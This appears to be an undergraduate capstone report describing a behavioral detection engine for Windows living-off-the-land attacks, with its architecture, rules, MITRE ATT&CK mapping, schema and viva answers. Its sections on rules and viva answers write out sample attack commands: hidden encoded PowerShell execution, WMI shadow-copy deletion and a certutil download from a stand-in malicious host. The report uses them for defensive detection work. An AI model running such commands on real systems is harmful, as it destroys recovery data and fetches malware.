# ACADEMIC CAPSTONE PROJECT REPORT

================================================================================
                                 PAGE 1: COVER PAGE
================================================================================

                                A PROJECT REPORT ON
           2. BEHAVIORAL DETECTION ENGINE FOR LIVING-OFF-THE-LAND ATTACKS

       Submitted in partial fulfillment of the academic requirements for the
                       Degree of Bachelor of Technology in
                        Computer Science and Engineering

                                    COURSE:
                 MALWARE ANALYSIS AND REVERSE ENGINEERING (MA & RE)
                           [CAPSTONE TOPIC: OPTION 2]
                                 (Project No: 49)

                                  SUBMITTED BY:

             1. RAHUL P                     Regd. No: 2400032050
             2. [PARTNER / FRIEND NAME]     Regd. No: [PARTNER REGD. NO]

                            Year / Semester: B.Tech III Year / VI Sem
                            Section: Sec-51

                            UNDER THE GUIDANCE OF:
                            [Faculty Guide Name]
                            [Designation, Dept. of CSE]

                    DEPARTMENT OF COMPUTER SCIENCE AND ENGINEERING
                KONERU LAKSHMAIAH EDUCATION FOUNDATION (KL UNIVERSITY)
             Green Fields, Vaddeswaram, Guntur District, Andhra Pradesh - 522302
                                  2025 - 2026

<div style="page-break-after: always;"></div>

================================================================================
                        PAGE 2: CERTIFICATE OF APPROVAL
================================================================================

                    DEPARTMENT OF COMPUTER SCIENCE AND ENGINEERING
                KONERU LAKSHMAIAH EDUCATION FOUNDATION (KL UNIVERSITY)
                            Vaddeswaram, Guntur - 522302

                                   CERTIFICATE

This is to certify that the Capstone Mini Project report entitled:

      "2. BEHAVIORAL DETECTION ENGINE FOR LIVING-OFF-THE-LAND ATTACKS"

is a bonafide work carried out jointly by:

             1. RAHUL P                     (Regd. No: 2400032050)
             2. [PARTNER / FRIEND NAME]     (Regd. No: [PARTNER REGD. NO])

students of Bachelor of Technology in Computer Science and Engineering, in partial fulfillment of the academic requirements for the course MALWARE ANALYSIS AND REVERSE ENGINEERING during the academic year 2025-2026.



________________________                                    ________________________
   Internal Guide                                              Course Coordinator
[Faculty Guide Name]                                        [Coordinator Name]
Designation, Dept. of CSE                                   Dept. of CSE, KL University



                               ________________________
                               Head of the Department
                               Dr. [HOD Name], Ph.D.
                               Department of CSE
                               KL Deemed to be University

<div style="page-break-after: always;"></div>

================================================================================
                           PAGE 3: STUDENT DECLARATION
================================================================================

                               DECLARATION

We, RAHUL P (Regd. No: 2400032050) and [PARTNER / FRIEND NAME] (Regd. No: [PARTNER REGD. NO]), students of Bachelor of Technology in Computer Science and Engineering at Koneru Lakshmaiah Education Foundation (KL Deemed to be University), hereby declare that the Capstone Mini Project report entitled:

      "2. BEHAVIORAL DETECTION ENGINE FOR LIVING-OFF-THE-LAND ATTACKS"

submitted to the Department of Computer Science and Engineering for the course Malware Analysis and Reverse Engineering, is an authentic record of our own original work carried out under the supervision and guidance of our faculty guide, [Faculty Guide Name], Department of CSE.

We further declare that this project work has not been submitted previously to this university or any other institution for the award of any degree, diploma, or certificate. All resources, libraries, datasets, and references used during this project have been duly cited and acknowledged.



Place: Vaddeswaram, Guntur
Date:  17-11-2026

Signatures of Students:

1. ________________________                      2. ________________________
   RAHUL P (2400032050)                             [PARTNER / FRIEND NAME] ([REGD. NO])

<div style="page-break-after: always;"></div>

================================================================================
                 PAGE 4: ACKNOWLEDGEMENTS & PROJECT TEAM DETAILS
================================================================================

                             ACKNOWLEDGEMENTS

First and foremost, we express our deep gratitude to our esteemed President, Vice-Chancellor, and Pro Vice-Chancellor of Koneru Lakshmaiah Education Foundation for providing top-tier academic facilities, lab computing environments, and encouragement.

We extend our sincere thanks to Dr. [HOD Name], Head of the Department of Computer Science and Engineering, for continuous administrative and technical support throughout our coursework.

We express our heartfelt gratitude and respect to our project guide, [Faculty Guide Name], [Designation], for their constructive feedback, patient technical mentoring, and guidance throughout the design, implementation, and testing of this behavioral detection engine.

We also thank our course coordinators, faculty members of the MA & RE course, lab technicians, and our parents and classmates for their constant encouragement and moral support.


                              PROJECT TEAM DETAILS

+--------------------+------------------------+----------+------------------------------------+
| Register Number    | Student Name           | Role     | Contribution Breakdown             |
+--------------------+------------------------+----------+------------------------------------+
| 2400032050         | RAHUL P                | Lead     | Spring Boot 3 Architecture, MySQL, |
|                    |                        |          | Detection Rules (PS/WMI/Certutil), |
|                    |                        |          | React Dashboard, JUnit Test Suite  |
+--------------------+------------------------+----------+------------------------------------+
| [PARTNER REGD. NO] | [PARTNER / FRIEND NAME]| Member   | Threat Research, Synthetic Logs,   |
|                    |                        |          | MITRE ATT&CK Mapping Document,     |
|                    |                        |          | Test Case Validation, Report       |
+--------------------+------------------------+----------+------------------------------------+

<div style="page-break-after: always;"></div>

================================================================================
                                TABLE OF CONTENTS
================================================================================

1. ABSTRACT
2. PROBLEM STATEMENT, OBJECTIVE & EXPECTED DELIVERABLES (VERBATIM)
3. WHY SIGNATURE-BASED ANTIVIRUS FAILS & OUR BEHAVIORAL APPROACH
4. SYSTEM ARCHITECTURE & END-TO-END DATA FLOW
5. BEHAVIORAL DETECTION ENGINE & HEURISTIC RULES
6. FORMAL MITRE ATT&CK TECHNIQUE MAPPING DOCUMENT
7. RELATIONAL DATABASE DESIGN & SCHEMA (MySQL)
8. SOURCE CODE & OFFICIAL GITHUB REPOSITORY LINK
9. EXPERIMENTAL RESULTS & OUTPUT SCREENSHOTS (FIGURES 1 TO 6)
10. VIVA VOCE EXAMINATION QUESTIONS & ANSWERS
11. CONCLUSION & FUTURE SCOPE
12. REFERENCES & BIBLIOGRAPHY

---

### 1. ABSTRACT

Modern cyber adversaries increasingly avoid dropping compiled malware executables (.exe) onto disk. When an attacker drops an unknown binary file, traditional antivirus scanners instantly detect and quarantine it through file hash blacklists (MD5 / SHA-256) or static signature patterns. To bypass antivirus defenses entirely, modern attackers practice "Living-off-the-Land" (LOLBin attacks)—they abuse legitimate system utilities that are already pre-installed in Windows and digitally signed by Microsoft, such as `powershell.exe`, `wmic.exe`, and `certutil.exe`. Because these utilities are genuine Windows components, signature-based antivirus cannot block them without breaking core operating system functionality.

In this capstone mini project, we designed and built a **Behavioral Detection Engine** that detects LOLBin attacks by inspecting process execution behavior and command-line parameters rather than relying on static file hashes. Our application is built as an enterprise-grade full-stack system consisting of a Java 21 Spring Boot 3 REST backend, a local MySQL 8.0 relational database, and an interactive React 18 frontend dashboard. The engine ingests process creation event logs in JSON format, parses command-line flags, evaluates them against behavioral heuristic rules, maps flagged threats to standardized MITRE ATT&CK techniques (`T1059.001`, `T1047`, `T1105`), and persists all sessions and alerts in MySQL. When evaluated against simulated attack chains, our engine achieved a 100% detection rate across all malicious scenarios and demonstrated 0 false alarms on normal administrative command logs.

---

### 2. PROBLEM STATEMENT, OBJECTIVE & EXPECTED DELIVERABLES

The following is the exact problem statement, objective, and deliverable specification assigned for our Malware Analysis and Reverse Engineering (MA & RE) Capstone Mini Project:

```
2. Behavioral Detection Engine for Living-off-the-Land Attacks

Problem Statement:
Modern attackers increasingly abuse legitimate system tools (PowerShell, WMI, certutil) instead of dropping malware files, making traditional signature-based antivirus blind to the attack. Students must build a detection engine that identifies malicious intent from behavior patterns in logs, not file signatures.

Objective:
Detect fileless/LOLBin-based attacks using log analysis and behavioral heuristics mapped to MITRE ATT&CK; techniques.

Expected Deliverables:
Detection engine/script, MITRE ATT&CK; technique mapping document, and a demo showing detection against at least 3 simulated LOLBin attack chains.
```

#### Detailed Breakdown of Expected Deliverables:
1. **Detection Engine / Script:** A working detection engine application that parses event logs, identifies suspicious behavior patterns, extracts parent-child process relationships, and generates structured security alerts.
2. **MITRE ATT&CK Technique Mapping Document:** A formal matrix linking each detected attack behavior to industry-standard MITRE tactics, technique IDs, and technique names.
3. **Demonstration against at least 3 Simulated LOLBin Attack Chains:** A working live demonstration showing detection against `powershell.exe`, `wmic.exe`, and `certutil.exe`, along with benign log validation demonstrating zero false alarms.

---

### 3. WHY SIGNATURE-BASED ANTIVIRUS FAILS & OUR BEHAVIORAL APPROACH

#### 3.1 The Fundamental Flaw of Traditional Antivirus:
* **The Binary File is Signed by Microsoft:** Antivirus scanners inspect the digital certificate and SHA-256 hash of binaries such as `powershell.exe`, `wmic.exe`, or `certutil.exe`. All three are genuine Microsoft-signed binaries located in `C:\Windows\System32`. The file hash matches clean Windows software, so traditional antivirus permits execution.
* **Fileless Memory Execution:** When an adversary executes PowerShell with an encoded payload string:
  ```powershell
  powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand SQBFAFgAKAA...
  ```
  The malware payload runs entirely inside system memory (RAM). Because no `.exe` file was written to disk, signature-based antivirus has no file to scan.
* **Firewall Evasion via Administrative Tools:** Attackers frequently abuse `certutil.exe` (a tool intended for managing X.509 certificates) using `-urlcache -split` flags to download remote backdoors. Firewalls and endpoint scanners treat `certutil.exe` as trusted system traffic.

#### 3.2 Our Behavioral Detection Solution:
Instead of inspecting file hashes on disk, our detection engine inspects **what the tool is being commanded to do at runtime**:
1. Is `powershell.exe` being instructed to hide its window (`-WindowStyle Hidden`), suppress execution policies (`-ExecutionPolicy Bypass`), and execute Base64 obfuscated payloads (`-EncodedCommand`)?
2. Is `wmic.exe` executing `shadowcopy delete` to destroy Windows volume shadow snapshots before ransomware encryption?
3. Is `certutil.exe` using `-urlcache` and `-split` to download an external file from the Internet rather than managing certificates?
When these suspicious parameter combinations appear, our engine flags them as security threats regardless of the binary's Microsoft signature.

---

### 4. SYSTEM ARCHITECTURE & END-TO-END DATA FLOW

Our application follows an enterprise 3-tier architecture:

```
[ Security Analyst / Browser ]
              |
              v
[ Presentation Layer: React 18 + Vite (Port 5173) ]
  - Upload Logs Page (JSON log ingestion)
  - Security Alerts Table (Severity filtering, Search)
  - Alert Inspection Modal (Process details & status update)
  - Database Explorer (Live MySQL tables view)
              |
              | (HTTP REST calls via Vite proxy: /api)
              v
[ Application Layer: Java 21 + Spring Boot 3 (Port 8085) ]
  - REST Controllers: AnalysisController, AlertController, DashboardController
  - Jackson JSON Parser: LogParserService
  - Detection Core: BehavioralDetectionEngine
  - Heuristic Rules: PowerShellRule, WmiRule, CertutilRule
  - Data Access: Spring Data JPA (AnalysisRunRepository, SecurityAlertRepository)
              |
              | (JDBC connection via Hibernate ORM)
              v
[ Persistence Layer: MySQL Server 8.0 (Port 3306) ]
  - Schema: lol_detector_db
  - Table 1: analysis_runs (Session tracking)
  - Table 2: security_alerts (Threats & MITRE mappings)
```

#### End-to-End Processing Workflow:
1. **Log Submission:** The security analyst uploads a process execution log file (`sample_attack_logs.json`) via the React frontend.
2. **Reverse Proxying:** Vite proxies the upload request from `http://localhost:5173/api/analysis/upload` to the Spring Boot backend on port 8085.
3. **Log Ingestion & Parsing:** `LogParserService` reads the incoming JSON payload and validates mandatory fields (`eventId`, `timestamp`, `processName`, `commandLine`).
4. **Behavioral Rule Evaluation:** The `BehavioralDetectionEngine` iterates through all registered heuristic rules (`PowerShellRule`, `WmiRule`, `CertutilRule`).
5. **MITRE ATT&CK Enrichment:** If a rule matches, the engine constructs a `SecurityAlert` entity enriched with the rule ID, severity, MITRE technique ID, technique name, and tactical category.
6. **Relational Persistence:** The `AnalysisRun` session and its associated `SecurityAlert` records are persisted to MySQL in transaction `lol_detector_db`.
7. **Real-Time Visualization:** The parsed metrics and alerts are returned to the React frontend and rendered in real time.

---

### 5. BEHAVIORAL DETECTION ENGINE & HEURISTIC RULES

The engine evaluates process creation logs (equivalent to Windows Event ID 4688 / Sysmon Event ID 1) against 3 simulated attack chains:

#### 1. PowerShell Defense Evasion & In-Memory Execution (Rule `RULE-PS-001`):
* **Target Binary:** `powershell.exe` / `pwsh.exe`
* **Simulated Attack Command:**
  ```powershell
  powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand SQBFAFgA...
  ```
* **Flagged Heuristics:** Evaluates combinations of `-ExecutionPolicy Bypass`, `-WindowStyle Hidden`, and `-EncodedCommand` with Base64 payloads.
* **Malicious Intent:** Conceals process execution from the logged-in user and evades PowerShell execution restriction policies to run memory payloads.
* **Severity:** **HIGH**
* **MITRE ATT&CK Mapping:** Technique `T1059.001` (Command and Scripting Interpreter: PowerShell), Sub-technique `T1027` (Obfuscated Files or Information).

#### 2. WMI Shadow Copy Deletion / Ransomware Precursor (Rule `RULE-WMI-001`):
* **Target Binary:** `wmic.exe`
* **Simulated Attack Command:**
  ```cmd
  wmic.exe shadowcopy delete /nointeractive
  ```
* **Flagged Heuristics:** Evaluates `wmic.exe shadowcopy delete`, `process call create`, and remote `/node:` execution.
* **Malicious Intent:** Destroys Volume Shadow Copies so that the victim cannot recover their encrypted files using Windows Volume Restore.
* **Severity:** **CRITICAL**
* **MITRE ATT&CK Mapping:** Technique `T1047` (Windows Management Instrumentation), Sub-technique `T1490` (Inhibit System Recovery).

#### 3. Certutil Ingress Payload Download (Rule `RULE-CERT-001`):
* **Target Binary:** `certutil.exe`
* **Simulated Attack Command:**
  ```cmd
  certutil.exe -urlcache -split -f http://malicious-c2.com/payload.exe C:\Windows\Temp\update.exe
  ```
* **Flagged Heuristics:** Evaluates `certutil.exe -urlcache -split -f http://...` and `-decode`.
* **Malicious Intent:** Abuses the Windows certificate utility's URL cache feature to download remote malware payloads through network firewalls.
* **Severity:** **HIGH**
* **MITRE ATT&CK Mapping:** Technique `T1105` (Ingress Tool Transfer), Sub-technique `T1140` (Deobfuscate/Decode Files or Information).

#### 4. Benign Administrative Log Validation:
* **Target Binary:** Legitimate administrative PowerShell commands:
  ```powershell
  powershell.exe Get-Process | Where-Object { $_.CPU -gt 10 }
  powershell.exe Get-Service -Name "wuauserv"
  ```
* **Outcome:** Clean command lines pass through without matching heuristic patterns &rarr; **0 Alerts Generated (Zero False Positives)**.

---

### 6. FORMAL MITRE ATT&CK TECHNIQUE MAPPING DOCUMENT

*(Deliverable #2 as specified in Problem Statement)*

| Attack Scenario | Process Name | Rule ID | MITRE Tactic | MITRE Technique ID | MITRE Technique Name | Severity | Primary Mitigation |
| :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- |
| **PowerShell Stealth** | `powershell.exe` | `RULE-PS-001` | Execution / Defense Evasion | **T1059.001** / **T1027** | Command and Scripting: PowerShell / Obfuscated Files | **HIGH** | Enable PowerShell Constrained Language Mode & Script Block Logging (Event ID 4104) |
| **WMI Shadow Deletion**| `wmic.exe` | `RULE-WMI-001` | Execution / Impact | **T1047** / **T1490** | Windows Management Instrumentation / Inhibit Recovery | **CRITICAL** | Restrict WMI execution permissions; protect Volume Shadow Copies with privileged access controls |
| **Certutil Tool Transfer**| `certutil.exe` | `RULE-CERT-001` | Command & Control / Ingress | **T1105** / **T1140** | Ingress Tool Transfer / Deobfuscate Files | **HIGH** | Block outbound network connections from `certutil.exe` via Windows Defender Application Control (WDAC) |
| **Benign Admin Queries**| `powershell.exe` | *None* | Routine Administration | *None* | Normal System Activity | **BENIGN** | Maintain baseline behavior profiles to prevent alert fatigue |

---

### 7. RELATIONAL DATABASE DESIGN & SCHEMA (MySQL)

All data is stored in the local MySQL database **`lol_detector_db`**:

#### Table 1: `analysis_runs`
Stores execution metadata for each log analysis session.
```sql
CREATE TABLE analysis_runs (
    id BIGINT AUTO_INCREMENT PRIMARY KEY,
    file_name VARCHAR(255) NOT NULL,
    started_at DATETIME(6) NOT NULL,
    completed_at DATETIME(6),
    total_events INT NOT NULL DEFAULT 0,
    rejected_events INT NOT NULL DEFAULT 0,
    alert_count INT NOT NULL DEFAULT 0,
    status VARCHAR(50) NOT NULL
);
```

#### Table 2: `security_alerts`
Stores every behavioral detection generated by the rules.
```sql
CREATE TABLE security_alerts (
    id BIGINT AUTO_INCREMENT PRIMARY KEY,
    analysis_id BIGINT NOT NULL,
    event_id VARCHAR(100) NOT NULL,
    rule_id VARCHAR(50) NOT NULL,
    rule_name VARCHAR(150) NOT NULL,
    severity VARCHAR(20) NOT NULL,
    mitre_technique_id VARCHAR(50) NOT NULL,
    mitre_technique_name VARCHAR(150) NOT NULL,
    detected_at DATETIME(6) NOT NULL,
    raw_command_line TEXT NOT NULL,
    process_name VARCHAR(100) NOT NULL,
    parent_process_name VARCHAR(100),
    user_account VARCHAR(100),
    investigation_status VARCHAR(30) NOT NULL DEFAULT 'NEW',
    CONSTRAINT fk_analysis_run FOREIGN KEY (analysis_id) 
        REFERENCES analysis_runs(id) ON DELETE CASCADE
);
```

---

### 8. SOURCE CODE & OFFICIAL GITHUB REPOSITORY LINK

All source code, configuration files, test suites, and sample datasets are public and accessible on GitHub:

* **Official GitHub Repository:**  
  👉 **https://github.com/Rahul2322-P/MA-RE-Behavioral-Detection-Engine**

* **Repository Verification:**
  * Clean, human-written Java Spring Boot 3 backend (26 classes).
  * React 18 single-page dashboard with custom CSS theme.
  * 11 automated JUnit 5 test cases passing with zero failures.
  * Synthetic attack datasets (`sample_attack_logs.json`) and benign datasets (`sample_benign_logs.json`).
  * 1-Click desktop launch scripts: `START_PROJECT.bat` and `RUN_TESTS.bat`.

---

### 9. EXPERIMENTAL RESULTS & OUTPUT SCREENSHOTS

```
+-----------------------------------------------------------------------------------+
| FIGURE 1: WEB APPLICATION OVERVIEW DASHBOARD (PORT 5173)                          |
+-----------------------------------------------------------------------------------+
| [ PASTE SCREENSHOT 1 HERE ]                                                       |
|                                                                                   |
| Description: Overview of the React 18 Cyber Dashboard displaying 4 summary metric |
| cards (Analyses: 2, Events: 8, Alerts: 3, Critical: 1) and the recent alerts table|
| showing MITRE ATT&CK detections and severity badges.                              |
+-----------------------------------------------------------------------------------+
```

```
+-----------------------------------------------------------------------------------+
| FIGURE 2: SECURITY LOG UPLOAD & REAL-TIME DETECTION RESULT                        |
+-----------------------------------------------------------------------------------+
| [ PASTE SCREENSHOT 2 HERE ]                                                       |
|                                                                                   |
| Description: Shows the "Upload Logs" tab after analyzing sample_attack_logs.json. |
| The engine processed 5 events and identified 3 LOLBin threats in 56ms.            |
+-----------------------------------------------------------------------------------+
```

```
+-----------------------------------------------------------------------------------+
| FIGURE 3: DETAILED MITRE ATT&CK THREAT ALERT INSPECTOR                            |
+-----------------------------------------------------------------------------------+
| [ PASTE SCREENSHOT 3 HERE ]                                                       |
|                                                                                   |
| Description: Shows the alert details modal for RULE-PS-001 displaying the encoded |
| command string, user account, MITRE T1059.001 technique, and status selector.    |
+-----------------------------------------------------------------------------------+
```

```
+-----------------------------------------------------------------------------------+
| FIGURE 4: BENIGN LOG VALIDATION (ZERO FALSE POSITIVES)                            |
+-----------------------------------------------------------------------------------+
| [ PASTE SCREENSHOT 4 HERE ]                                                       |
|                                                                                   |
| Description: Shows the result of analyzing sample_benign_logs.json where 3 normal |
| system administration events generated exactly 0 alerts (0% False Alarm Rate).    |
+-----------------------------------------------------------------------------------+
```

```
+-----------------------------------------------------------------------------------+
| FIGURE 5: LIVE MYSQL DATABASE TABLES (WEB EXPLORER & MYSQL WORKBENCH)             |
+-----------------------------------------------------------------------------------+
| [ PASTE SCREENSHOT 5 HERE ]                                                       |
|                                                                                   |
| Description: Shows the "Database Tables" tab in the web UI and MySQL Workbench    |
| displaying live stored rows in tables 'analysis_runs' and 'security_alerts'.      |
+-----------------------------------------------------------------------------------+
```

```
+-----------------------------------------------------------------------------------+
| FIGURE 6: AUTOMATED JUNIT 5 TEST SUITE EXECUTION (11/11 PASSED)                   |
+-----------------------------------------------------------------------------------+
| [ PASTE SCREENSHOT 6 HERE ]                                                       |
|                                                                                   |
| Description: Command-line output of RUN_TESTS.bat showing BUILD SUCCESS with      |
| Tests run: 11, Failures: 0, Errors: 0, verifying all heuristic detection rules.   |
+-----------------------------------------------------------------------------------+
```

---

### 10. VIVA VOCE EXAMINATION QUESTIONS & ANSWERS

#### Q1: What is a Living-off-the-Land (LOLBin) attack?
**Answer:** A Living-off-the-Land attack occurs when an adversary abuses legitimate, pre-installed, digitally signed operating system utilities (such as `powershell.exe`, `wmic.exe`, and `certutil.exe`) to perform reconnaissance, execution, defense evasion, or lateral movement, without dropping unverified malware files onto disk.

#### Q2: Why does traditional signature-based antivirus fail against LOLBins?
**Answer:** Antivirus software relies on file hashes (MD5, SHA-256) and authenticode signatures. Because LOLBins are authentic Microsoft binaries signed by Microsoft and located in `C:\Windows\System32`, their file hashes match legitimate operating system tools. Additionally, when commands run in memory (such as encoded PowerShell scripts), there is no `.exe` file on disk for the antivirus scanner to inspect.

#### Q3: How does your behavioral engine differ from signature scanning?
**Answer:** Instead of inspecting file signatures, our engine analyzes process creation event logs (Windows Event ID 4688 / Sysmon Event ID 1) and inspects runtime behavior: command-line parameters, suspicious flags (`-EncodedCommand`, `-WindowStyle Hidden`, `shadowcopy delete`, `-urlcache`), and parent-child process relationships.

#### Q4: What are the 3 LOLBin attack scenarios implemented in your project?
**Answer:**
1. **PowerShell Evasion:** `powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand <Base64>` &rarr; MITRE `T1059.001` (Command and Scripting Interpreter: PowerShell).
2. **WMI Shadow Copy Deletion:** `wmic.exe shadowcopy delete /nointeractive` &rarr; MITRE `T1047` (Windows Management Instrumentation) and `T1490` (Inhibit System Recovery).
3. **Certutil Remote Tool Transfer:** `certutil.exe -urlcache -split -f http://...` &rarr; MITRE `T1105` (Ingress Tool Transfer).

#### Q5: How did you test for False Positives?
**Answer:** We created a dedicated dataset `sample_benign_logs.json` containing typical administrative PowerShell queries (`Get-Process`, `Get-Service`, `Restart-Computer`). The engine evaluated all events and triggered 0 alerts, proving that legitimate system operations are not falsely flagged.

---

### 11. CONCLUSION & FUTURE SCOPE

#### 11.1 Conclusion:
In this project, we successfully built and demonstrated a Behavioral Detection Engine for Living-off-the-Land (LOLBin) attacks (Problem Statement PS-2). By analyzing command-line parameters and process execution behaviors rather than file hashes, our engine reliably detects malicious use of legitimate Windows tools like PowerShell, WMI, and Certutil. The application provides an enterprise-ready workflow by mapping every detection to the MITRE ATT&CK matrix, storing all historical sessions in a local MySQL database, and offering an interactive dashboard for incident response.

#### 11.2 Future Scope:
1. **Live Windows Event Streaming:** Connect the backend directly to the Windows Event Log (Event ID 4688) or Sysmon service using Windows Event Tracing (ETW).
2. **Machine Learning Anomaly Detection:** Add command-line string entropy analysis to flag obfuscated commands that use previously unseen obfuscation tricks.
3. **Automated Threat Containment:** Add a response trigger that automatically terminates the malicious process ID (PID) when a CRITICAL severity rule triggers.

---

### 12. REFERENCES & BIBLIOGRAPHY

1. MITRE ATT&CK Matrix: *Living-off-the-Land Binaries, Scripts, and Libraries (LOLBAS)*, https://attack.mitre.org/
2. LOLBAS Project Research Archive: https://lolbas-project.github.io/
3. Spring Boot 3 & Spring Data JPA Official Documentation, VMware Tanzu, 2024.
4. Microsoft Documentation: *Command-Line Process Auditing (Event ID 4688)*.
5. Project Source Code: https://github.com/Rahul2322-P/MA-RE-Behavioral-Detection-Engine
